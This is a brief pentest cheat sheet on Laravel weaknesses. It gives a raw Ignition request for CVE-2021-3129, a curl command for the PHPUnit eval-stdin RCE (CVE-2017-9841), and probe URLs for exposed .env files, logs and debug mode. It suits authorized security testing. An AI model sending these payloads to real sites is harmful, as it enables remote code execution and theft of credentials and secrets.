# Laravel Common Bugs

## Introduction
What would you do if you came across a website that uses Laravel?

## How to Detect
Usually in the HTTP response there is a header like this `Set-Cookie: laravel_session=`

1. Find the related CVE by checking laravel version
* How to find the laravel version

By checking the composer file in `https://example.com/composer.json`, sometimes the version is printed there. If you found outdated laravel version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-16542/product_id-38139/Laravel-Laravel.html)

Some example CVE:

- CVE-2021-3129 (Remote Code Execution)
```
POST /_ignition/execute-solution HTTP/1.1
Host: example.com
Accept: application/json
Content-Type: application/json

{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "cve20213129", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
```

2. Laravel 4.8.28 ~ 5.x - PHPUnit Remote Code Execution (CVE-2017-9841)
```
curl -d "<?php echo php_uname(); ?>" http://example.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

3. Exposed environment variables 
* Full Path Exploit : http://example.com/.env

![Environment Variables](https://1.bp.blogspot.com/-EUTxgP5XE6Q/XkgB4SyWSbI/AAAAAAAAAQA/eqtALOjLKKA46si-lIosm6cDVmxByjzIQCLcBGAsYHQ/s1600/1.png)

4. Exposed log files
* Full Path Exploit : http://example.com/storage/logs/laravel.log

5. Laravel Debug Mode Enabled
* Try to request to https://example.com using POST method (Error 405)
* Using [] in paramater (ex:example.com/param[]=0)

![Laravel Debug Mode](https://hacken.io/wp-content/uploads/2019/07/laravel-screen.png)

## References
* [Nakanosec](https://www.nakanosec.com/2020/02/common-bug-pada-laravel.html)
